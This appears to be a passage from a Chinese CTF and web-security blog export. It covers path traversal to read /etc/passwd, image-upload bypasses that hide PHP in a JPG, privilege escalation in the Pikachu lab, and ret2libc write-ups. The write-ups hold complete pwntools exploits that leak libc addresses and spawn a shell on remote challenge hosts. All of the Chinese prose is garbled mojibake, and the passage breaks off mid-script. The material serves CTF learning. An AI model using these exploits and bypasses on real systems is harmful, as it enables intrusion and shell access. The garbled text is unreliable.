<p>â€‹	ä¸€èˆ¬å½“æˆ‘ä»¬ç‚¹å‡»ä¸‹è½½é“¾æ¥ï¼Œä¾¿ä¼šå‘åå°å‘é€ä¸€ä¸ªä¸‹è½½è¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚ä¼šåŒ…å«ä¸€ä¸ªéœ€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°ï¼Œå<br>å°åœ¨æ”¶åˆ°è¯·æ±‚åï¼Œä¼šå¼€å§‹æ‰§è¡Œä¸‹è½½ä»£ç ï¼Œå°†è¯¥æ–‡ä»¶å¯¹åº”çš„æ–‡ä»¶**<em>response</em>** ç»™æµè§ˆå™¨ï¼Œä»è€Œå®Œæˆä¸‹è½½ã€‚<br>â€‹	å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶ååï¼Œå°†å…¶ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­è€Œä¸å¯¹å…¶è¿›è¡Œå®‰å…¨åˆ¤æ–­çš„è¯ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚<br>æ­¤æ—¶å¦‚æœæ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„ï¼ˆå¦‚<code>../../../etc/passwd</code>ï¼‰ï¼Œåˆ™å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯ï¼ˆå¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰ï¼‰è¢«ä¸‹è½½ã€‚</p>
<h3 id="é˜²èŒƒæªæ–½-1"><a href="#é˜²èŒƒæªæ–½-1" class="headerlink" title="é˜²èŒƒæªæ–½"></a><strong>é˜²èŒƒæªæ–½</strong></h3><ul>
<li>å¯¹ä¼ å…¥çš„æ–‡ä»¶åè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’Œé™å®š</li>
<li>å¯¹æ–‡ä»¶ä¸‹è½½çš„ç›®å½•è¿›è¡Œä¸¥æ ¼çš„é™å®š</li>
</ul>
<p>æˆåŠŸä¸‹è½½äº†<code>flag.txt</code>æ–‡ä»¶</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756208.png" alt="image-20241013184458217" style="zoom: 50%;" />

<h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a><code>getimagesize</code></h3><p><code>PHP</code>ä¸­çš„<code>getimagesize()</code>å‡½æ•°æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºè·å–å›¾åƒçš„å¤§å°ã€‚<code>getimagesize()</code>è¿”å›ç»“æœä¸­æœ‰æ–‡ä»¶å¤§å°å’Œæ–‡ä»¶ç±»å‹ï¼Œå¦‚æœç”¨è¿™ä¸ªå‡½æ•°æ¥è·å–ç±»å‹ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡çš„è¯ï¼Œä¼šå­˜åœ¨é—®é¢˜ã€‚</p>
<p>ä»‹ç»ä¸¤ä¸ªç»•è¿‡æ–¹æ³•ï¼š</p>
<ul>
<li>ç›´æ¥ä¼ªé€ å¤´éƒ¨<code>GIF89A</code></li>
<li>ç”¨<code>copy 1.php/a+1.jpg/b 2.jpg</code>å‘½ä»¤åˆæˆï¼Œç„¶åä¸Šä¼ <code>2.jpg</code>ï¼Œå†é…åˆæ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œ<code>2.jpg</code>ä¸­çš„ä»£ç </li>
</ul>
<h2 id="Over-Permissionè¶Šæƒ"><a href="#Over-Permissionè¶Šæƒ" class="headerlink" title="Over Permissionè¶Šæƒ"></a><code>Over Permission</code>è¶Šæƒ</h2><p>â€‹	è¶Šæƒæ¼æ´å½¢æˆçš„åŸå› æ˜¯åå°ä½¿ç”¨äº† ä¸åˆç†çš„æƒé™æ ¡éªŒè§„åˆ™å¯¼è‡´çš„ã€‚ä¸€èˆ¬è¶Šæƒæ¼æ´å®¹æ˜“å‡ºç°åœ¨æƒé™é¡µé¢ï¼ˆéœ€è¦ç™»å½•çš„é¡µé¢ï¼‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„çš„åœ°æ–¹ï¼Œå½“ç”¨æˆ·å¯¹æƒé™é¡µé¢å†…çš„ä¿¡æ¯è¿›è¡Œè¿™äº›æ“ä½œæ—¶ï¼Œåå°éœ€è¦å¯¹å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæ ¡éªŒï¼Œçœ‹å…¶æ˜¯å¦å…·å¤‡æ“ä½œçš„æƒé™ï¼Œä»è€Œç»™å‡ºå“åº”ï¼Œè€Œå¦‚æœæ ¡éªŒçš„è§„åˆ™è¿‡äºç®€å•åˆ™å®¹æ˜“å‡ºç°è¶Šæƒæ¼æ´ã€‚</p>
<p>ä¸‹é¢æ¥ç®€å•è®¤è¯†ä¸€ä¸‹è¶Šæƒæ“ä½œï¼š</p>
<h3 id="æ°´å¹³è¶Šæƒ"><a href="#æ°´å¹³è¶Šæƒ" class="headerlink" title="æ°´å¹³è¶Šæƒ"></a>æ°´å¹³è¶Šæƒ</h3><p>åœ¨ç™»å½•é¡µé¢ç™»å½•ç”¨æˆ·<code>lili</code>çš„è´¦å·</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756536.png" alt="image-20241015124201596" style="zoom:50%;" />

<p>æˆåŠŸç™»å½•åï¼Œç‚¹å‡»æŸ¥çœ‹ä¸ªäººä¿¡æ¯</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756584.png" alt="image-20241015124215044" style="zoom:50%;" />

<p>æ­¤æ—¶ä¼šå‘åå°æäº¤ä¸€ä¸ª<code>GET</code>è¯·æ±‚ï¼Œå¹¶æä¾›äº†å½“å‰ç”¨æˆ·çš„ç”¨æˆ·åï¼Œåå°ä¾¿ä¼šå°†å½“å‰ç”¨æˆ·çš„ä¿¡æ¯è¿”å›åˆ°é¡µé¢</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131806617.png" alt="image-20241015124237973" style="zoom:50%;" />

<p>å½“æˆ‘ä»¬ä¿®æ”¹<code>URL</code>ä¸­çš„<code>username</code>å‚æ•°ä¸ºå¦ä¸€ä¸ªç”¨æˆ·å<code>kobe</code>æ—¶ï¼Œé¡µé¢ä¾¿ä¼šå‡ºç°<code>kobe</code>ç”¨æˆ·çš„ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— éœ€å¯†ç ä¾¿å¾—åˆ°äº†<code>kobe</code>çš„ä¸ªäººä¿¡æ¯ï¼Œå®ç°äº†æ°´å¹³è¶Šæƒ</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756191.png" alt="image-20241015124313480" style="zoom:50%;" />

<h3 id="å‚ç›´è¶Šæƒ"><a href="#å‚ç›´è¶Šæƒ" class="headerlink" title="å‚ç›´è¶Šæƒ"></a>å‚ç›´è¶Šæƒ</h3><p>å…ˆè·å–è¶…çº§ç”¨æˆ·æ·»åŠ ç”¨æˆ·çš„<code>URL</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756384.png" alt="image-20241015141619677" style="zoom:50%;" />

<p>ç™»å½•<code>pikachu</code>ç”¨æˆ·</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756333.png" alt="image-20241015141746803" style="zoom:50%;" />

<p>ç›´æ¥æ›¿æ¢å½“å‰é¡µé¢çš„<code>URL</code>ä¸ºå‰é¢ä¿å­˜çš„<code>URL</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131756794.png" alt="image-20241015141905178" style="zoom:50%;" />

<p>ç°åœ¨å·²ç»å¯ä»¥é€šè¿‡<code>pikachu</code>ç”¨æˆ·æ·»åŠ ç”¨æˆ·          </p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2libcå­¦ä¹ æ€»ç»“</title>
    <url>/2023/12/12/ret2libc%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="ç›¸å…³çŸ¥è¯†"><a href="#ç›¸å…³çŸ¥è¯†" class="headerlink" title="ç›¸å…³çŸ¥è¯†"></a>ç›¸å…³çŸ¥è¯†</h2><h3 id="ä»€ä¹ˆæ˜¯ret2libc"><a href="#ä»€ä¹ˆæ˜¯ret2libc" class="headerlink" title="ä»€ä¹ˆæ˜¯ret2libc"></a>ä»€ä¹ˆæ˜¯<code>ret2libc</code></h3><p>â€‹	<code>ret2libc</code>å³<code>return to libc</code>ï¼Œå³æ§åˆ¶ç¨‹åºä¸­å‡½æ•°çš„è¿”å›åœ°å€ä¸º<code>libc</code>ä¸­å‡½æ•°çš„åœ°å€ï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œåé—¨å‡½æ•°ï¼Œæ‹¿åˆ°<code>shell</code>ã€‚</p>
<p>â€‹	è¿™é‡Œæœ‰ä¸€ä¸ªå…¬å¼ï¼šå‡½æ•°çš„çœŸå®åœ°å€ &#x3D; <code>libc</code>åº“çš„åŸºåœ°å€ + å‡½æ•°åœ¨<code>libc</code>åº“çš„åœ°å€åç§»</p>
<span id="more"></span>

<h3 id="ä»€ä¹ˆæ˜¯libc"><a href="#ä»€ä¹ˆæ˜¯libc" class="headerlink" title="ä»€ä¹ˆæ˜¯libc"></a>ä»€ä¹ˆæ˜¯<code>libc</code></h3><p>â€‹	<code>libc</code>æ˜¯<code>c</code>æ ‡å‡†åº“çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‡Œé¢æœ‰å¸¸ç”¨çš„<code>c</code>è¯­è¨€å‡½æ•°ã€‚                                                      </p>
<h3 id="å¦‚ä½•å¯»æ‰¾åœ°å€åç§»é‡"><a href="#å¦‚ä½•å¯»æ‰¾åœ°å€åç§»é‡" class="headerlink" title="å¦‚ä½•å¯»æ‰¾åœ°å€åç§»é‡"></a>å¦‚ä½•å¯»æ‰¾åœ°å€åç§»é‡</h3><p>æ³•1ï¼š</p>
<p>ä½¿ç”¨å‘½ä»¤<code>ldd pwn</code>ï¼ŒæŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶<code>pwn</code>åœ¨æœ¬åœ°çš„è¿™ä¸ªç¯å¢ƒä¸Šä¾èµ–çš„<code>libc</code>åº“ï¼Œ<code>/lib/x86_64-linux-gnu/libc.so.6</code>æ˜¯ç»å¯¹è·¯å¾„ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347333.png" alt="image-20240103151448590"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">system_offset = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_offset = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>æ³•2ï¼š</p>
<ul>
<li>åœ¨ç¨‹åºä¸­å¯»æ‰¾å­—ç¬¦ä¸²çš„åœ°å€</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn3 --string <span class="string">&#x27;sh&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348729.png" alt="image-20240115152507540"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep <span class="string">&quot;system&quot;</span></span><br><span class="line"><span class="comment">#readelfæŸ¥æ‰¾å¹¶æ‰“å°ç¬¦å·è¡¨ä¿¡æ¯</span></span><br><span class="line">strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment">#stringæŸ¥æ‰¾å¹¶æ‰“å°å­—ç¬¦ä¸²ä¿¡æ¯</span></span><br></pre></td></tr></table></figure>

<p>æ³•3ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)  <span class="comment">#æŸ¥æ‰¾libcç‰ˆæœ¬</span></span><br><span class="line">system_offset = libc.dump(<span class="string">&#x27;system&#x27;</span>)  <span class="comment">#å‡½æ•°åœ°å€åç§»é‡</span></span><br></pre></td></tr></table></figure>

<p>æ³•4ï¼š</p>
<p>é€šè¿‡å·²çŸ¥çš„æŸä¸ª<code>libc</code>å‡½æ•°çš„åœ°å€ï¼Œåœ¨<a href="https://libc.blukat.me(`ctrl`+ç‚¹å‡»/">https://libc.blukat.meï¼ˆ`ctrl`+ç‚¹å‡»</a> ç›´æ¥è·³è½¬ï¼‰è¿™ä¸ªç½‘ç«™ä¸­æŸ¥æ‰¾åˆ°å¯¹åº”çš„<code>libc</code>æ•°æ®åº“ï¼Œå¯ä»¥ç›´æ¥çœ‹åˆ°åœ°å€åç§»é‡ã€‚</p>
<h3 id="è¿™é‡Œæ”¾ä¸€ä¸ªæ¥æ”¶å‡½æ•°åœ°å€çš„æ–¹å¼æ€»ç»“ï¼š"><a href="#è¿™é‡Œæ”¾ä¸€ä¸ªæ¥æ”¶å‡½æ•°åœ°å€çš„æ–¹å¼æ€»ç»“ï¼š" class="headerlink" title="è¿™é‡Œæ”¾ä¸€ä¸ªæ¥æ”¶å‡½æ•°åœ°å€çš„æ–¹å¼æ€»ç»“ï¼š"></a>è¿™é‡Œæ”¾ä¸€ä¸ªæ¥æ”¶å‡½æ•°åœ°å€çš„æ–¹å¼æ€»ç»“ï¼š</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># p.recvuntil(b&#x27;\n&#x27;)ï¼šä»è¾“å…¥æµä¸­æ¥æ”¶æ•°æ®ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ä¸ºæ­¢ã€‚</span></span><br><span class="line"><span class="comment"># [:-1]ï¼šå°†æ¥æ”¶åˆ°çš„æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼ˆæ¢è¡Œç¬¦ï¼‰å»é™¤ã€‚</span></span><br><span class="line"><span class="comment"># .ljust(8,b&#x27;\0&#x27;)ï¼šå°†å‰©ä¸‹çš„æ•°æ®ç”¨ç©ºå­—èŠ‚`\0`å¡«å……åˆ°8å­—èŠ‚çš„é•¿åº¦ã€‚s.ljust(width,fillchar)ä¸­widthä¸ºå¯¹å‰é¢å­—ç¬¦ä¸²sçš„å¡«å……å®½åº¦ï¼Œfillcharä¸ºå¡«å……å†…å®¹ã€‚</span></span><br><span class="line"><span class="comment"># u64()ï¼šå°†å¡«å……åçš„8å­—èŠ‚æ•°æ®è§£æä¸ºä¸€ä¸ª64ä½çš„æ— ç¬¦å·æ•´æ•°ã€‚</span></span><br><span class="line">addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="ä¾‹é¢˜1ï¼šbuu-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop"><a href="#ä¾‹é¢˜1ï¼šbuu-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop" class="headerlink" title="ä¾‹é¢˜1ï¼šbuu é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop"></a>ä¾‹é¢˜<code>1</code>ï¼š<code>buu</code> <code>é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</code></h3><p>æŸ¥çœ‹ä¿æŠ¤ï¼Œåªå¼€äº†<code>NX</code>ï¼Œ</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347339.png" alt="image-20231222194215373"></p>
<p>æ˜æ˜¾æ ˆæº¢å‡ºï¼Œ</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348996.png" alt="image-20231222193823696"></p>
<p>å¯ä»¥æ³„æ¼<code>write</code>å‡½æ•°åœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"><span class="comment">#ELFæ˜¯pwntoolsåº“ä¸­çš„å‡½æ•°ï¼Œç”¨äºåŠ è½½å’Œåˆ†æELFæ–‡ä»¶ã€‚</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]  <span class="comment">#è·å–mainå‡½æ•°åœ°å€</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  <span class="comment">#è·å–writeå‡½æ•°åœ¨pltä¸­çš„åœ°å€</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  <span class="comment">#è·å–writeå‡½æ•°çš„gotåœ°å€ï¼ŒæŒ‡å‘gotè¡¨ä¸­writeçš„çœŸå®åœ°å€</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)  </span><br><span class="line">payload += p32(write_plt)  <span class="comment">#è°ƒç”¨writeå‡½æ•°</span></span><br><span class="line">payload += p32(main_addr)  <span class="comment">#è°ƒç”¨å®Œwriteåçš„è¿”å›åœ°å€ï¼Œè¦é‡æ–°åœ¨æ‰§è¡Œä¸€éä¸»è¦å‡½æ•°</span></span><br><span class="line">payload += p32(<span class="number">1</span>)  <span class="comment">#writeå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ ‡å‡†è¾“å‡º</span></span><br><span class="line">payload += p32(write_got)  <span class="comment">#ç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))  <span class="comment">#ä»æ¥æ”¶åˆ°çš„æ•°æ®ä¸­æå–ä¸€ä¸ª4å­—èŠ‚ï¼ˆ32 ä½ï¼‰çš„å€¼</span></span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br></pre></td></tr></table></figure>

<p>åŒç†ä¹Ÿå¯ä»¥å¾—åˆ°<code>read</code>å‡½æ•°çš„åœ°å€ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨<a href="https://libc.blukat.meè¿™ä¸ªç½‘ç«™ä¸Š,é€šè¿‡`write,read`å‡½æ•°çš„åœ°å€ç¡®å®š`libc`ç‰ˆæœ¬,å¯ç›´æ¥æ‰¾åˆ°ä¸€äº›å‡½æ•°åœ°å€åç§»é‡./">https://libc.blukat.meè¿™ä¸ªç½‘ç«™ä¸Šï¼Œé€šè¿‡`write,read`å‡½æ•°çš„åœ°å€ç¡®å®š`libc`ç‰ˆæœ¬ï¼Œå¯ç›´æ¥æ‰¾åˆ°ä¸€äº›å‡½æ•°åœ°å€åç§»é‡ã€‚</a></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348032.png" alt="image-20231221203418960"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28149)</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;./2018_rop&#x27;)</span><br><span class="line">#ELFæ˜¯pwntoolsåº“ä¸­çš„å‡½æ•°ï¼Œç”¨äºåŠ è½½å’Œåˆ†æELFæ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]  #è·å–mainå‡½æ•°åœ°å€</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]  #è·å–writeå‡½æ•°åœ¨pltä¸­çš„åœ°å€</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]  #è·å–writeå‡½æ•°çš„gotåœ°å€ï¼ŒæŒ‡å‘gotè¡¨ä¸­writeçš„çœŸå®åœ°å€</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x88+4)  </span><br><span class="line">payload += p32(write_plt)  #è°ƒç”¨writeå‡½æ•°</span><br><span class="line">payload += p32(main_addr)  #è°ƒç”¨å®Œwriteåçš„è¿”å›åœ°å€ï¼Œè¦é‡æ–°åœ¨æ‰§è¡Œä¸€éä¸»è¦å‡½æ•°</span><br><span class="line">payload += p32(1)  #writeå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ ‡å‡†è¾“å‡º</span><br><span class="line">payload += p32(write_got)  #ç¬¬äºŒä¸ªå‚æ•°</span><br><span class="line">payload += p32(4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(4))  #ä»æ¥æ”¶åˆ°çš„æ•°æ®ä¸­æå–ä¸€ä¸ª4å­—èŠ‚ï¼ˆ32 ä½ï¼‰çš„å€¼</span><br><span class="line">#print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">write_offset = 0x0e56f0</span><br><span class="line">system_offset = 0x03cd10</span><br><span class="line">str_bin_sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">base_addr = write_addr-write_offset</span><br><span class="line">system_addr = base_addr+system_offset</span><br><span class="line">str_bin_sh_addr = base_addr+str_bin_sh_offset</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(0)+p32(str_bin_sh_addr)</span><br><span class="line">#p32(0)æ˜¯è°ƒç”¨å®Œsystemå‡½æ•°åçš„è¿”å›åœ°å€ï¼Œä½†æ˜¯å› ä¸ºæ‰§è¡Œå®Œsystemåä¼šå¼€å¯ä¸€ä¸ªå­è¿›ç¨‹é˜»å¡å½“å‰çš„è¿›ç¨‹ï¼Œsystemä¹Ÿå°±ä¸ä¼šè¿”å›ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥æ”¾ä»»æ„åœ°å€ï¼Œä½†æ˜¯ä¸€å®šè¦æ”¾åœ°å€ã€‚</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ä¾‹é¢˜2ï¼šbuu-jarvisoj-level3"><a href="#ä¾‹é¢˜2ï¼šbuu-jarvisoj-level3" class="headerlink" title="ä¾‹é¢˜2ï¼šbuu jarvisoj_level3"></a>ä¾‹é¢˜<code>2</code>ï¼š<code>buu</code> <code>jarvisoj_level3</code></h3><p>çœ‹ä¿æŠ¤ï¼Œåªå¼€äº†<code>NX</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348238.png" alt="image-20231222175342689"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347523.png" alt="image-20231222175522487"></p>
<p>å¯ä»¥æ³„æ¼<code>write</code>å‡½æ•°çš„åœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#è¿™é‡Œå¯ä»¥åˆå¹¶æˆ p.sendlineafter(b&#x27;Input:\n&#x27;,payload)</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘åœ¨ç½‘ç«™ä¸Šæ²¡æœ‰æ‰¾åˆ°ç›¸åº”çš„<code>libc</code>ç‰ˆæœ¬ï¼Œä¸èƒ½ç›´æ¥æ‰¾åˆ°å‡½æ•°åœ°å€åç§»é‡ï¼Œä½†æ˜¯<code>buu</code>ä¸Šçš„é¢˜éƒ½ç»™äº†<code>libc</code>ç‰ˆæœ¬</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132348534.png" alt="image-20231222180314290" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132347946.png" alt="image-20231222180348083" style="zoom:80%;" />

<p>çŸ¥é“<code>libc</code>ç‰ˆæœ¬åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ‰¾åˆ°åç§»é‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc-2.23.soè¿™ä¸ªELFæ–‡ä»¶è¦åœ¨å½“å‰ç›®å½•ä¸‹å­˜åœ¨ï¼Œç›´æ¥åœ¨buuä¸Šä¸‹è½½å³å¯</span></span><br><span class="line"><span class="comment">#è¿™é‡Œå®šä¹‰äº†libc-2.23.soåº“çš„ä¸€ä¸ªå¯¹è±¡libc</span></span><br><span class="line"></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#symbolæ˜¯libcçš„ä¸€ä¸ªå±æ€§ï¼Œç”¨äºå­˜å‚¨ libc ä¸­å„ä¸ªç¬¦å·ï¼ˆå‡½æ•°ã€å˜é‡ç­‰ï¼‰çš„åœ°å€ã€‚</span></span><br><span class="line"></span><br><span class="line">str_bin_sh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#search()ç”¨äºåœ¨libcä¸­æœç´¢æŒ‡å®šå­—ç¬¦ä¸²çš„åœ°å€ã€‚</span></span><br><span class="line"><span class="comment">#next() æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºè·å–ä¸€ä¸ªè¿­ä»£å™¨çš„ä¸‹ä¸€ä¸ªå…ƒç´ ã€‚åœ¨è¿™é‡Œï¼Œå®ƒç”¨äºè·å–æœç´¢ç»“æœä¸­ç¬¬ä¸€ä¸ªåŒ¹é… /bin/sh çš„åœ°å€ã€‚</span></span><br></pre></td></tr></table></figure>

<p><code>exp</code>å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26641</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#è¿™é‡Œå¯ä»¥åˆå¹¶æˆ 